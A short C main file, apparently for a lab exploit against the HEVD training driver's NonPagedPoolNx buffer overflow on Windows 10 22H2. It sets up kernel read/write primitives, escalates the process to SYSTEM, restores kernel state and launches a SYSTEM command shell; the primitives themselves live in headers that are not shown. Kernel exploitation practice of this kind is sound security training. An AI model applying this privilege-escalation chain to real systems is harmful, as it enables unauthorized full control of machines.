#include <stdio.h>

#include "core/privilege_escalation.h"
#include "core/cleanup.h"
#include "windows_api/windows_api.h"

int main()
{
    puts("HEVD - BufferOverflowNonPagedPoolNx Exploit (Low Integrity)");
    puts("Windows 10 Version 22H2 (OS Build 19045.3930)");
    puts("-----");

    puts("\n[*] Initializing Windows API functions...");
    if (!InitializeWindowsApiWrappers())
    {
        fprintf(stderr, "[-] Failed to load required functions\n");
        return 1;
    }

    exploit_addresses_t addrs = { 0 };

    puts("\n# 1. Setting up arbitrary read/write primitives\n");
    if (!SetupPrimitives(&addrs))
    {
        fprintf(stderr, "[-] Failed to setup primitives\n");
        return 1;
    }

    puts("\n# 2. Escalating process privileges to SYSTEM\n");
    if (!EscalatePrivileges(&addrs))
    {
        fprintf(stderr, "[-] Failed to escalate privileges\n");
        return 1;
    }

    puts("\n# 3. Restoring kernel state\n");
    if (!RestoreKernelState(&addrs))
    {
        fprintf(stderr, "[-] Failed to restore kernel state\n");
        return 1;
    }

    puts("\n[*] Launching SYSTEM shell");
    system("start cmd.exe");

    return 0;
}
